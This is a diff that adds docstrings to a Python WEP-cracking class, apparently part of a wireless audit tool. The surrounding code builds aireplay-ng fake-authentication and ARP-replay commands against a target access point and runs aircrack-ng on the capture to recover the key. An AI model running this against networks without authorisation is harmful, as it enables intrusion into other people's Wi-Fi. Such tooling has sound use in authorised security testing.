@@ -11,13 +11,31 @@ from wicc_enc_type import EncryptionType
 import time
 import threading
 
+
 class WEP(EncryptionType):
     def __init__(self, network, interface, mac, verbose_level):
+        """
+        Constructor for the WEP class (also calls the parent constructor)
+        :param network: target network for the attack
+        :param interface: selected wireless interface
+        :param mac: attacker mac address
+        :param verbose_level: verbose level set by main
+
+        :Author: Miguel Yanes Fernández
+        """
         EncryptionType.__init__(self, network, interface, verbose_level)
         # super().__init__(self, network, interface)
         self.mac = mac
 
     def scan_network(self, write_directory):
+        """
+        Method to scan the target network. With the selected attacker's mac, makes a fake authentication to the network
+        to then send arp responses to generate data.
+        :param write_directory: directory to write the scan files
+        :return: none
+
+        :Author: Miguel Yanes Fernández
+        """
         super(WEP, self).scan_network(write_directory)
 
         fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-a', self.mac, '-e', self.essid, '-T', '3', self.interface]
@@ -32,7 +50,14 @@ class WEP(EncryptionType):
         arpreplay_thread.join(0)
 
         self.show_message("running aireplay thread on mac: " + self.mac)
+
     def crack_network(self):
+        """
+        Crack the selected network. Aircrack is left running until if gets enough iv's to crack the connection key
+        :return: password key
+
+        :Author: Miguel Yanes Fernández
+        """
         aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap']
         self.show_message("will execute aircrack")
         crack_out, crack_err = super().execute_command(aircrack_cmd)
